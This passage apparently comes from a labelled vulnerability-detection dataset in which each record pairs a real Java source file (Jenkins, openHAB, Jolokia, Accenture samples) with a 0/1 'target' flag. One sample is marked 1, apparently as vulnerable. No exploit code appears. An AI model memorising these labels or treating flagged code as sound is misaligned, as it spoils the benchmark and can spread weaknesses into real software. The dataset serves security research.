Cipher sym = PASSING_ANNOTATOR.encrypt();\n        ObjectOutputStream oos = new ObjectOutputStream(new GZIPOutputStream(new CipherOutputStream(baos,sym)));\n        oos.writeLong(System.currentTimeMillis()); // send timestamp to prevent a replay attack\n        oos.writeObject(caw.getConsoleAnnotator());\n        oos.close();\n        StaplerResponse rsp = Stapler.getCurrentResponse();\n        if (rsp!=null)\n            rsp.setHeader(\"X-ConsoleAnnotator\", new String(Base64.encode(baos.toByteArray())));\n        return r;\n    }\n\n    /**\n     * Used for sending the state of ConsoleAnnotator to the client, because we are deserializing this object later.\n     */\n    private static final CryptoConfidentialKey PASSING_ANNOTATOR = new CryptoConfidentialKey(AnnotatedLargeText.class,\"consoleAnnotator\");\n}\n", "target": 0}
{"idx": 1068, "func": "/*\n\n    Copyright 2018-2020 Accenture Technology\n\n    Licensed under the Apache License, Version 2.0 (the \"License\");\n    you may not use this file except in compliance with the License.\n    You may obtain a copy of the License at\n\n        http://www.apache.org/licenses/LICENSE-2.0\n\n    Unless required by applicable law or agreed to in writing, software\n    distributed under the License is distributed on an \"AS IS\" BASIS,\n    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n    See the License for the specific language governing permissions and\n    limitations under the License.\n\n */\n\npackage org.platformlambda.services;\n\nimport org.platformlambda.core.exception.AppException;\nimport org.platformlambda.core.models.EventEnvelope;\nimport org.platformlambda.core.models.LambdaFunction;\nimport org.platformlambda.core.system.Platform;\nimport org.platformlambda.models.ObjectWithGenericType;\nimport org.platformlambda.models.SamplePoJo;\n\nimport java.io.IOException;\nimport java.util.Date;\nimport java.util.Map;\n\npublic class HelloGeneric implements LambdaFunction {\n\n    @Override\n    public Object handleEvent(Map<String, String> headers, Object body, int instance) throws AppException, IOException {\n\n        String id = headers.get(\"id\");\n        if (id == null) {\n            throw new IllegalArgumentException(\"Missing parameter 'id'\");\n        }\n\n        if (id.equals(\"1\")) {\n            // to set status, key-values or parametric types, we can use EventEnvelope as a result wrapper\n            EventEnvelope result = new EventEnvelope();\n\n            ObjectWithGenericType<SamplePoJo> genericObject = new ObjectWithGenericType<>();\n            // return some place-holder values to demonstrate the PoJo can be transported over the network\n            SamplePoJo mock = new SamplePoJo(1, \"Class with generic type resolved at run-time to be SamplePoJo\", \"200 World Blvd, Planet Earth\");\n            // set current timestamp to indicate that the object is a new one\n            mock.setDate(new Date());\n            // set instance count and service origin ID to show that the object comes from a different instance\n            mock.setInstance(instance);\n            mock.setOrigin(Platform.getInstance().getOrigin());\n\n            genericObject.setId(101);\n            genericObject.setContent(mock);\n\n            result.setBody(genericObject);\n            result.setParametricType(SamplePoJo.class);\n\n            return result;\n        } else {\n            throw new AppException(404, \"Not found. Try id = 1\");\n        }\n\n    }\n\n}\n", "target": 1}
{"idx": 1069, "func": "/**\n * Copyright (c) 2010-2020 Contributors to the openHAB project\n *\n * See the NOTICE file(s) distributed with this work for additional\n * information.\n *\n * This program and the accompanying materials are made available under the\n * terms of the Eclipse Public License 2.0 which is available at\n * http://www.eclipse.org/legal/epl-2.0\n *\n * SPDX-License-Identifier: EPL-2.0\n */\npackage org.openhab.binding.insteon.internal.device;\n\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.HashMap;\nimport java.util.Map.Entry;\n\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.ParserConfigurationException;\n\nimport org.eclipse.jdt.annotation.NonNullByDefault;\nimport org.eclipse.jdt.annotation.Nullable;\nimport org.openhab.binding.insteon.internal.device.DeviceType.FeatureGroup;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\nimport org.w3c.dom.Node;\nimport org.w3c.dom.NodeList;\nimport org.xml.sax.SAXException;\n\n/**\n * Reads the device types from an xml file.\n *\n * @author Daniel Pfrommer - Initial contribution\n * @author Bernd Pfrommer - openHAB 1 insteonplm binding\n * @author Rob Nielsen - Port to openHAB 2 insteon binding\n */\n@NonNullByDefault\n@SuppressWarnings(\"null\")\npublic class DeviceTypeLoader {\n    private static final Logger logger = LoggerFactory.getLogger(DeviceTypeLoader.class);\n    private HashMap<String, DeviceType> deviceTypes = new HashMap<>();\n    private @Nullable static DeviceTypeLoader deviceTypeLoader = null;\n\n    private DeviceTypeLoader() {\n    } // private so nobody can call it\n\n    /**\n     * Finds the device type for a given product key\n     *\n     * @param aProdKey product key to search for\n     * @return the device type, or null if not found\n     */\n    public @Nullable DeviceType getDeviceType(String aProdKey) {\n        return (deviceTypes.get(aProdKey));\n    }\n\n    /**\n     * Must call loadDeviceTypesXML() before calling this function!\n     *\n     * @return currently known device types\n     */\n    public HashMap<String, DeviceType> getDeviceTypes() {\n        return (deviceTypes);\n    }\n\n    /**\n     * Reads the device types from input stream and stores them in memory for\n     * later access.\n     *\n     * @param is the input stream from which to read\n     */\n    public void loadDeviceTypesXML(InputStream in) throws ParserConfigurationException, SAXException, IOException {\n        DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();\n        // see https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html\n        dbFactory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n        dbFactory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n        dbFactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n        dbFactory.setXIncludeAware(false);\n        dbFactory.setExpandEntityReferences(false);\n        DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();\n        Document doc = dBuilder.parse(in);\n        doc.getDocumentElement().normalize();\n        Node root = doc.getDocumentElement();\n        NodeList nodes = root.getChildNodes();\n        for (int i = 0; i < nodes.getLength(); i++) {\n            Node node = nodes.item(i);\n            if (node.getNodeType() == Node.ELEMENT_NODE && node.getNodeName().equals(\"device\")) {\n                processDevice((Element) node);\n            }\n        }\n    }\n\n    /**\n     * Reads the device types from file and stores them in memory for later access.\n     *\n     * @param aFileName The name of the file to read from\n     * @throws ParserConfigurationException\n     * @throws SAXException\n     * @throws IOException\n     */\n    public void loadDeviceTypesXML(String aFileName) throws ParserConfigurationException, SAXException, IOException {\n        File file = new File(aFileName);\n        InputStream in = new FileInputStream(file);\n        loadDeviceTypesXML(in);\n    }\n\n    /**\n     * Process device node\n     *\n     * @param e name of the element to process\n     * @throws SAXException\n     */\n    private void processDevice(Element e) throws SAXException {\n        String productKey = e.getAttribute(\"productKey\");\n        if (productKey.equals(\"\")) {\n            throw new SAXException(\"device in device_types file has no product key!\");\n        }\n        if (deviceTypes.containsKey(productKey)) {\n            logger.warn(\"overwriting previous definition of device {}\", productKey);\n            deviceTypes.remove(productKey);\n        }\n        DeviceType devType = new DeviceType(productKey);\n\n        NodeList nodes = e.getChildNodes();\n        for (int i = 0; i < nodes.getLength(); i++) {\n            Node node = nodes.item(i);\n            if (node.getNodeType() != Node.ELEMENT_NODE) {\n                continue;\n            }\n            Element subElement = (Element) node;\n            if (subElement.getNodeName().equals(\"model\")) {\n                devType.setModel(subElement.getTextContent());\n            } else if (subElement.getNodeName().equals(\"description\")) {\n                devType.setDescription(subElement.getTextContent());\n            } else if (subElement.getNodeName().equals(\"feature\")) {\n                processFeature(devType, subElement);\n            } else if (subElement.getNodeName().equals(\"feature_group\")) {\n                processFeatureGroup(devType, subElement);\n            }\n            deviceTypes.put(productKey, devType);\n        }\n    }\n\n    private String processFeature(DeviceType devType, Element e) throws SAXException {\n        String name = e.getAttribute(\"name\");\n        if (name.equals(\"\")) {\n            throw new SAXException(\"feature \" + e.getNodeName() + \" has feature without name!\");\n        }\n        if (!name.equals(name.toLowerCase())) {\n            throw new SAXException(\"feature name '\" + name + \"' must be lower case\");\n        }\n        if (!devType.addFeature(name, e.getTextContent())) {\n            throw new SAXException(\"duplicate feature: \" + name);\n        }\n        return (name);\n    }\n\n    private String processFeatureGroup(DeviceType devType, Element e) throws SAXException {\n        String name = e.getAttribute(\"name\");\n        if (name.equals(\"\")) {\n            throw new SAXException(\"feature group \" + e.getNodeName() + \" has no name attr!\");\n        }\n        String type = e.getAttribute(\"type\");\n        if (type.equals(\"\")) {\n            throw new SAXException(\"feature group \" + e.getNodeName() + \" has no type attr!\");\n        }\n        FeatureGroup fg = new FeatureGroup(name, type);\n        NodeList nodes = e.getChildNodes();\n        for (int i = 0; i < nodes.getLength(); i++) {\n            Node node = nodes.item(i);\n            if (node.getNodeType() != Node.ELEMENT_NODE) {\n                continue;\n            }\n            Element subElement = (Element) node;\n            if (subElement.getNodeName().equals(\"feature\")) {\n                fg.addFeature(processFeature(devType, subElement));\n            } else if (subElement.getNodeName().equals(\"feature_group\")) {\n                fg.addFeature(processFeatureGroup(devType, subElement));\n            }\n        }\n        if (!devType.addFeatureGroup(name, fg)) {\n            throw new SAXException(\"duplicate feature group \" + name);\n        }\n        return (name);\n    }\n\n    /**\n     * Helper function for debugging\n     */\n    private void logDeviceTypes() {\n        for (Entry<String, DeviceType> dt : getDeviceTypes().entrySet()) {\n            String msg = String.format(\"%-10s->\", dt.getKey()) + dt.getValue();\n            logger.debug(\"{}\", msg);\n        }\n    }\n\n    /**\n     * Singleton instance function, creates DeviceTypeLoader\n     *\n     * @return DeviceTypeLoader singleton reference\n     */\n    @Nullable\n    public static synchronized DeviceTypeLoader instance() {\n        if (deviceTypeLoader == null) {\n            deviceTypeLoader = new DeviceTypeLoader();\n            InputStream input = DeviceTypeLoader.class.getResourceAsStream(\"/device_types.xml\");\n            try {\n                deviceTypeLoader.loadDeviceTypesXML(input);\n            } catch (ParserConfigurationException e) {\n                logger.warn(\"parser config error when reading device types xml file: \", e);\n            } catch (SAXException e) {\n                logger.warn(\"SAX exception when reading device types xml file: \", e);\n            } catch (IOException e) {\n                logger.warn(\"I/O exception when reading device types xml file: \", e);\n            }\n            logger.debug(\"loaded {} devices: \", deviceTypeLoader.getDeviceTypes().size());\n            deviceTypeLoader.logDeviceTypes();\n        }\n        return deviceTypeLoader;\n    }\n}\n", "target": 0}
{"idx": 1070, "func": "package org.jboss.resteasy.resteasy1073;\n\nimport javax.xml.bind.annotation.XmlRootElement;\n\n@XmlRootElement\npublic class TestWrapper\n{\n   private String name;\n   public String getName()\n   {\n      return name;\n   }\n   public void setName(String name)\n   {\n      this.name = name;\n   }\n}", "target": 0}
{"idx": 1071, "func": "package org.jolokia.util;\n\nimport java.util.regex.Pattern;\n\n/**\n * Helper class for handling proper response mime types\n *\n * @author roland\n * @since 24.01.18\n */\npublic class MimeTypeUtil {\n\n\n    /**\n     * Extract the response mime type. This value is calculated for different situations:\n     * <p>\n     * <ul>\n     * <li>If a callback is given and its valid, the mime type is \"text/javascript\"</li>\n     * <li>Otherwise:\n     * <ul>\n     * <li>If a valid mimeType is given in the request (\"text/plain\", \"application/json\"), then this\n     * mimet type is returned</li>\n     * <li>If another mimeType is given, then \"text/plain\" is used</li>\n     * <li>If no mimeType is given then a given default mime type is used, but also sanitized\n     * as described above</li>\n     * </ul>\n     * </li>\n     * </ul>\n     *\n     * @param pRequestMimeType the mimetype given in the request\n     * @param defaultMimeType  the default mime type to use if none is given in the request\n     * @param pCallback        a callback given (can be null)\n     */\n    public static String getResponseMimeType(String pRequestMimeType, String defaultMimeType, String pCallback) {\n\n        // For a valid given callback, return \"text/javascript\" for proper inclusion\n        if (pCallback != null && isValidCallback(pCallback)) {\n            return \"text/javascript\";\n        }\n\n        // Pick up mime time from request, but sanitize\n        if (pRequestMimeType != null) {\n            return sanitize(pRequestMimeType);\n        }\n\n        // Use the given default mime type (possibly picked up from a configuration)\n        return sanitize(defaultMimeType);\n    }\n\n    private static String sanitize(String mimeType) {\n        for (String accepted : new String[]{\n            \"application/json\",\n            \"text/plain\"\n        }) {\n            if (accepted.equalsIgnoreCase(mimeType)) {\n                return accepted;\n            }\n        }\n        return \"text/plain\";\n    }\n\n    /**\n     * Check that a callback matches a javascript function name. The argument must be not null\n     *\n     * @param pCallback callback to verify\n     * @return true if valud, false otherwise\n     */\n    public static boolean isValidCallback(String pCallback) {\n        Pattern validJavaScriptFunctionNamePattern =\n            Pattern.compile(\"^[$A-Z_][0-9A-Z_$]*$\", Pattern.CASE_INSENSITIVE);\n        return validJavaScriptFunctionNamePattern.matcher(pCallback).matches();\n    }\n\n}", "target": 0}
{"idx": 1072, "func": "/*\n * The MIT License\n *\n * Copyright (c) 2004-2011, Sun Microsystems, Inc., Kohsuke Kawaguchi,\n * Erik Ramfelt, Koichi Fujikawa, Red Hat, Inc., Seiji Sogabe,\n * Stephen Connolly, Tom Huybrechts, Yahoo! Inc., Alan Harder, CloudBees, Inc.,\n * Yahoo!, Inc.\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\npackage jenkins.model;\n\nimport com.google.common.collect.Lists;\nimport com.google.inject.Injector;\nimport hudson.ExtensionComponent;\nimport hudson.ExtensionFinder;\nimport hudson.model.LoadStatistics;\nimport hudson.model.Messages;\nimport hudson.model.Node;\nimport hudson.model.AbstractCIBase;\nimport hudson.model.AbstractProject;\nimport hudson.model.Action;\nimport hudson.model.AdministrativeMonitor;\nimport hudson.model.AllView;\nimport hudson.model.Api;\nimport hudson.model.Computer;\nimport hudson.model.ComputerSet;\nimport hudson.model.DependencyGraph;\nimport hudson.model.Describable;\nimport hudson.model.Descriptor;\nimport hudson.model.DescriptorByNameOwner;\nimport hudson.model.DirectoryBrowserSupport;\nimport hudson.model.Failure;\nimport hudson.model.Fingerprint;\nimport hudson.model.FingerprintCleanupThread;\nimport hudson.model.FingerprintMap;\nimport hudson.model.FullDuplexHttpChannel;\nimport hudson.model.Hudson;\nimport hudson.model.Item;\nimport hudson.model.ItemGroup;\nimport hudson.model.ItemGroupMixIn;\nimport hudson.model.Items;\nimport hudson.model.JDK;\nimport hudson.model.Job;\nimport hudson.model.JobPropertyDescriptor;\nimport hudson.model.Label;\nimport hudson.model.ListView;\nimport hudson.model.LoadBalancer;\nimport hudson.model.ManagementLink;\nimport hudson.model.NoFingerprintMatch;\nimport hudson.model.OverallLoadStatistics;\nimport hudson.model.Project;\nimport hudson.model.RestartListener;\nimport hudson.model.RootAction;\nimport hudson.model.Slave;\nimport hudson.model.TaskListener;\nimport hudson.model.TopLevelItem;\nimport hudson.model.TopLevelItemDescriptor;\nimport hudson.model.UnprotectedRootAction;\nimport hudson.model.UpdateCenter;\nimport hudson.model.User;\nimport hudson.model.View;\nimport hudson.model.ViewGroup;\nimport hudson.model.ViewGroupMixIn;\nimport hudson.model.Descriptor.FormException;\nimport hudson.model.labels.LabelAtom;\nimport hudson.model.listeners.ItemListener;\nimport hudson.model.listeners.SCMListener;\nimport hudson.model.listeners.SaveableListener;\nimport hudson.model.Queue;\nimport hudson.model.WorkspaceCleanupThread;\n\nimport antlr.ANTLRException;\nimport com.google.common.collect.ImmutableMap;\nimport com.thoughtworks.xstream.XStream;\nimport hudson.BulkChange;\nimport hudson.DNSMultiCast;\nimport hudson.DescriptorExtensionList;\nimport hudson.Extension;\nimport hudson.ExtensionList;\nimport hudson.ExtensionPoint;\nimport hudson.FilePath;\nimport hudson.Functions;\nimport hudson.Launcher;\nimport hudson.Launcher.LocalLauncher;\nimport hudson.LocalPluginManager;\nimport hudson.Lookup;\nimport hudson.markup.MarkupFormatter;\nimport hudson.Plugin;\nimport hudson.PluginManager;\nimport hudson.PluginWrapper;\nimport hudson.ProxyConfiguration;\nimport hudson.TcpSlaveAgentListener;\nimport hudson.UDPBroadcastThread;\nimport hudson.Util;\nimport static hudson.Util.fixEmpty;\nimport static hudson.Util.fixNull;\nimport hudson.WebAppMain;\nimport hudson.XmlFile;\nimport hudson.cli.CLICommand;\nimport hudson.cli.CliEntryPoint;\nimport hudson.cli.CliManagerImpl;\nimport hudson.cli.declarative.CLIMethod;\nimport hudson.cli.declarative.CLIResolver;\nimport hudson.init.InitMilestone;\nimport hudson.init.InitStrategy;\nimport hudson.lifecycle.Lifecycle;\nimport hudson.logging.LogRecorderManager;\nimport hudson.lifecycle.RestartNotSupportedException;\nimport hudson.markup.RawHtmlMarkupFormatter;\nimport hudson.remoting.Channel;\nimport hudson.remoting.LocalChannel;\nimport hudson.remoting.VirtualChannel;\nimport hudson.scm.RepositoryBrowser;\nimport hudson.scm.SCM;\nimport hudson.search.CollectionSearchIndex;\nimport hudson.search.SearchIndexBuilder;\nimport hudson.search.SearchItem;\nimport hudson.security.ACL;\nimport hudson.security.AccessControlled;\nimport hudson.security.AuthorizationStrategy;\nimport hudson.security.BasicAuthenticationFilter;\nimport hudson.security.FederatedLoginService;\nimport hudson.security.FullControlOnceLoggedInAuthorizationStrategy;\nimport hudson.security.HudsonFilter;\nimport hudson.security.LegacyAuthorizationStrategy;\nimport hudson.security.LegacySecurityRealm;\nimport hudson.security.Permission;\nimport hudson.security.PermissionGroup;\nimport hudson.security.PermissionScope;\nimport hudson.security.SecurityMode;\nimport hudson.security.SecurityRealm;\nimport hudson.security.csrf.CrumbIssuer;\nimport hudson.slaves.Cloud;\nimport hudson.slaves.ComputerListener;\nimport hudson.slaves.DumbSlave;\nimport hudson.slaves.EphemeralNode;\nimport hudson.slaves.NodeDescriptor;\nimport hudson.slaves.NodeList;\nimport hudson.slaves.NodeProperty;\nimport hudson.slaves.NodePropertyDescriptor;\nimport hudson.slaves.NodeProvisioner;\nimport hudson.slaves.OfflineCause;\nimport hudson.slaves.RetentionStrategy;\nimport hudson.tasks.BuildWrapper;\nimport hudson.tasks.Builder;\nimport hudson.tasks.Publisher;\nimport hudson.triggers.SafeTimerTask;\nimport hudson.triggers.Trigger;\nimport hudson.triggers.TriggerDescriptor;\nimport hudson.util.AdministrativeError;\nimport hudson.util.CaseInsensitiveComparator;\nimport hudson.util.ClockDifference;\nimport hudson.util.CopyOnWriteList;\nimport hudson.util.CopyOnWriteMap;\nimport hudson.util.DaemonThreadFactory;\nimport hudson.util.DescribableList;\nimport hudson.util.FormApply;\nimport hudson.util.FormValidation;\nimport hudson.util.Futures;\nimport hudson.util.HudsonIsLoading;\nimport hudson.util.HudsonIsRestarting;\nimport hudson.util.Iterators;\nimport hudson.util.JenkinsReloadFailed;\nimport hudson.util.Memoizer;\nimport hudson.util.MultipartFormDataParser;\nimport hudson.util.RemotingDiagnostics;\nimport hudson.util.RemotingDiagnostics.HeapDump;\nimport hudson.util.StreamTaskListener;\nimport hudson.util.TextFile;\nimport hudson.util.TimeUnit2;\nimport hudson.util.VersionNumber;\nimport hudson.util.XStream2;\nimport hudson.views.DefaultMyViewsTabBar;\nimport hudson.views.DefaultViewsTabBar;\nimport hudson.views.MyViewsTabBar;\nimport hudson.views.ViewsTabBar;\nimport hudson.widgets.Widget;\nimport jenkins.ExtensionComponentSet;\nimport jenkins.ExtensionRefreshException;\nimport jenkins.InitReactorRunner;\nimport jenkins.model.ProjectNamingStrategy.DefaultProjectNamingStrategy;\nimport jenkins.security.ConfidentialKey;\nimport jenkins.security.ConfidentialStore;\nimport net.sf.json.JSONObject;\nimport org.acegisecurity.AccessDeniedException;\nimport org.acegisecurity.AcegiSecurityException;\nimport org.acegisecurity.Authentication;\nimport org.acegisecurity.GrantedAuthority;\nimport org.acegisecurity.GrantedAuthorityImpl;\nimport org.acegisecurity.context.SecurityContextHolder;\nimport org.acegisecurity.providers.anonymous.AnonymousAuthenticationToken;\nimport org.acegisecurity.ui.AbstractProcessingFilter;\nimport org.apache.commons.jelly.JellyException;\nimport org.apache.commons.jelly.Script;\nimport org.apache.commons.logging.LogFactory;\nimport org.jvnet.hudson.reactor.Executable;\nimport org.jvnet.hudson.reactor.ReactorException;\nimport org.jvnet.hudson.reactor.Task;\nimport org.jvnet.hudson.reactor.TaskBuilder;\nimport org.jvnet.hudson.reactor.TaskGraphBuilder;\nimport org.jvnet.hudson.reactor.Reactor;\nimport org.jvnet.hudson.reactor.TaskGraphBuilder.Handle;\nimport org.kohsuke.accmod.Restricted;\nimport org.kohsuke.accmod.restrictions.NoExternalUse;\nimport org.kohsuke.args4j.Argument;\nimport org.kohsuke.args4j.Option;\nimport org.kohsuke.stapler.Ancestor;\nimport org.kohsuke.stapler.HttpRedirect;\nimport org.kohsuke.stapler.HttpResponse;\nimport org.kohsuke.stapler.HttpResponses;\nimport org.kohsuke.stapler.MetaClass;\nimport org.kohsuke.stapler.QueryParameter;\nimport org.kohsuke.stapler.Stapler;\nimport org.kohsuke.stapler.StaplerFallback;\nimport org.kohsuke.stapler.StaplerProxy;\nimport org.kohsuke.stapler.StaplerRequest;\nimport org.kohsuke.stapler.StaplerResponse;\nimport org.kohsuke.stapler.WebApp;\nimport org.kohsuke.stapler.export.Exported;\nimport org.kohsuke.stapler.export.ExportedBean;\nimport org.kohsuke.stapler.framework.adjunct.AdjunctManager;\nimport org.kohsuke.stapler.interceptor.RequirePOST;\nimport org.kohsuke.stapler.jelly.JellyClassLoaderTearOff;\nimport org.kohsuke.stapler.jelly.JellyRequestDispatcher;\nimport org.xml.sax.InputSource;\n\nimport javax.crypto.SecretKey;\nimport javax.servlet.RequestDispatcher;\nimport javax.servlet.ServletContext;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletResponse;\n\nimport static hudson.init.InitMilestone.*;\nimport static javax.servlet.http.HttpServletResponse.SC_BAD_REQUEST;\nimport static javax.servlet.http.HttpServletResponse.SC_NOT_FOUND;\nimport java.io.File;\nimport java.io.FileFilter;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.PrintWriter;\nimport java.io.StringWriter;\nimport java.net.BindException;\nimport java.net.URL;\nimport java.nio.charset.Charset;\nimport java.security.SecureRandom;\nimport java.text.Collator;\nimport java.text.ParseException;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.Collection;\nimport java.util.Collections;\nimport java.util.Comparator;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport java.util.Properties;\nimport java.util.Set;\nimport java.util.Stack;\nimport java.util.StringTokenizer;\nimport java.util.Timer;\nimport java.util.TreeSet;\nimport java.util.UUID;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.CopyOnWriteArrayList;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\nimport java.util.logging.Level;\nimport static java.util.logging.Level.SEVERE;\nimport java.util.logging.LogRecord;\nimport java.util.logging.Logger;\nimport java.util.regex.Pattern;\nimport javax.annotation.CheckForNull;\nimport javax.annotation.Nonnull;\nimport javax.annotation.Nullable;\n\n/**\n * Root object of the system.\n *\n * @author Kohsuke Kawaguchi\n */\n@ExportedBean\npublic class Jenkins extends AbstractCIBase implements ModifiableTopLevelItemGroup, StaplerProxy, StaplerFallback, ViewGroup, AccessControlled, DescriptorByNameOwner, ModelObjectWithContextMenu {\n    private transient final Queue queue;\n\n    /**\n     * Stores various objects scoped to {@link Jenkins}.\n     */\n    public transient final Lookup lookup = new Lookup();\n\n    /**\n     * We update this field to the current version of Hudson whenever we save {@code config.xml}.\n     * This can be used to detect when an upgrade happens from one version to next.\n     *\n     * <p>\n     * Since this field is introduced starting 1.301, \"1.0\" is used to represent every version\n     * up to 1.300. This value may also include non-standard versions like \"1.301-SNAPSHOT\" or\n     * \"?\", etc., so parsing needs to be done with a care.\n     *\n     * @since 1.301\n     */\n    // this field needs to be at the very top so that other components can look at this value even during unmarshalling\n    private String version = \"1.0\";\n\n    /**\n     * Number of executors of the master node.\n     */\n    private int numExecutors = 2;\n\n    /**\n     * Job allocation strategy.\n     */\n    private Mode mode = Mode.NORMAL;\n\n    /**\n     * False to enable anyone to do anything.\n     * Left as a field so that we can still read old data that uses this flag.\n     *\n     * @see #authorizationStrategy\n     * @see #securityRealm\n     */\n    private Boolean useSecurity;\n\n    /**\n     * Controls how the\n     * <a href=\"http://en.wikipedia.org/wiki/Authorization\">authorization</a>\n     * is handled in Hudson.\n     * <p>\n     * This ultimately controls who has access to what.\n     *\n     * Never null.\n     */\n    private volatile AuthorizationStrategy authorizationStrategy = AuthorizationStrategy.UNSECURED;\n\n    /**\n     * Controls a part of the\n     * <a href=\"http://en.wikipedia.org/wiki/Authentication\">authentication</a>\n     * handling in Hudson.\n     * <p>\n     * Intuitively, this corresponds to the user database.\n     *\n     * See {@link HudsonFilter} for the concrete authentication protocol.\n     *\n     * Never null. Always use {@link #setSecurityRealm(SecurityRealm)} to\n     * update this field.\n     *\n     * @see #getSecurity()\n     * @see #setSecurityRealm(SecurityRealm)\n     */\n    private volatile SecurityRealm securityRealm = SecurityRealm.NO_AUTHENTICATION;\n    \n    /**\n     * The project naming strategy defines/restricts the names which can be given to a project/job. e.g. does the name have to follow a naming convention?\n     */\n    private ProjectNamingStrategy projectNamingStrategy = DefaultProjectNamingStrategy.DEFAULT_NAMING_STRATEGY;\n\n    /**\n     * Root directory for the workspaces. This value will be variable-expanded against\n     * job name and JENKINS_HOME.\n     *\n     * @see #getWorkspaceFor(TopLevelItem)\n     */\n    private String workspaceDir = \"${ITEM_ROOTDIR}/\"+WORKSPACE_DIRNAME;\n\n    /**\n     * Root directory for the workspaces. This value will be variable-expanded against\n     * job name and JENKINS_HOME.\n     *\n     * @see #getBuildDirFor(Job)\n     */\n    private String buildsDir = \"${ITEM_ROOTDIR}/builds\";\n\n    /**\n     * Message displayed in the top page.\n     */\n    private String systemMessage;\n\n    private MarkupFormatter markupFormatter;\n\n    /**\n     * Root directory of the system.\n     */\n    public transient final File root;\n\n    /**\n     * Where are we in the initialization?\n     */\n    private transient volatile InitMilestone initLevel = InitMilestone.STARTED;\n\n    /**\n     * All {@link Item}s keyed by their {@link Item#getName() name}s.\n     */\n    /*package*/ transient final Map<String,TopLevelItem> items = new CopyOnWriteMap.Tree<String,TopLevelItem>(CaseInsensitiveComparator.INSTANCE);\n\n    /**\n     * The sole instance.\n     */\n    private static Jenkins theInstance;\n\n    private transient volatile boolean isQuietingDown;\n    private transient volatile boolean terminating;\n\n    private List<JDK> jdks = new ArrayList<JDK>();\n\n    private transient volatile DependencyGraph dependencyGraph;\n\n    /**\n     * Currently active Views tab bar.\n     */\n    private volatile ViewsTabBar viewsTabBar = new DefaultViewsTabBar();\n\n    /**\n     * Currently active My Views tab bar.\n     */\n    private volatile MyViewsTabBar myViewsTabBar = new DefaultMyViewsTabBar();\n\n    /**\n     * All {@link ExtensionList} keyed by their {@link ExtensionList#extensionType}.\n     */\n    private transient final Memoizer<Class,ExtensionList> extensionLists = new Memoizer<Class,ExtensionList>() {\n        public ExtensionList compute(Class key) {\n            return ExtensionList.create(Jenkins.this,key);\n        }\n    };\n\n    /**\n     * All {@link DescriptorExtensionList} keyed by their {@link DescriptorExtensionList#describableType}.\n     */\n    private transient final Memoizer<Class,DescriptorExtensionList> descriptorLists = new Memoizer<Class,DescriptorExtensionList>() {\n        public DescriptorExtensionList compute(Class key) {\n            return DescriptorExtensionList.createDescriptorList(Jenkins.this,key);\n        }\n    };\n\n    /**\n     * {@link Computer}s in this Hudson system. Read-only.\n     */\n    protected transient final Map<Node,Computer> computers = new CopyOnWriteMap.Hash<Node,Computer>();\n\n    /**\n     * Active {@link Cloud}s.\n     */\n    public final Hudson.CloudList clouds = new Hudson.CloudList(this);\n\n    public static class CloudList extends DescribableList<Cloud,Descriptor<Cloud>> {\n        public CloudList(Jenkins h) {\n            super(h);\n        }\n\n        public CloudList() {// needed for XStream deserialization\n        }\n\n        public Cloud getByName(String name) {\n            for (Cloud c : this)\n                if (c.name.equals(name))\n                    return c;\n            return null;\n        }\n\n        @Override\n        protected void onModified() throws IOException {\n            super.onModified();\n            Jenkins.getInstance().trimLabels();\n        }\n    }\n\n    /**\n     * Set of installed cluster nodes.\n     * <p>\n     * We use this field with copy-on-write semantics.\n     * This field has mutable list (to keep the serialization look clean),\n     * but it shall never be modified. Only new completely populated slave\n     * list can be set here.\n     * <p>\n     * The field name should be really {@code nodes}, but again the backward compatibility\n     * prevents us from renaming.\n     */\n    protected volatile NodeList slaves;\n\n    /**\n     * Quiet period.\n     *\n     * This is {@link Integer} so that we can initialize it to '5' for upgrading users.\n     */\n    /*package*/ Integer quietPeriod;\n\n    /**\n     * Global default for {@link AbstractProject#getScmCheckoutRetryCount()}\n     */\n    /*package*/ int scmCheckoutRetryCount;\n\n    /**\n     * {@link View}s.\n     */\n    private final CopyOnWriteArrayList<View> views = new CopyOnWriteArrayList<View>();\n\n    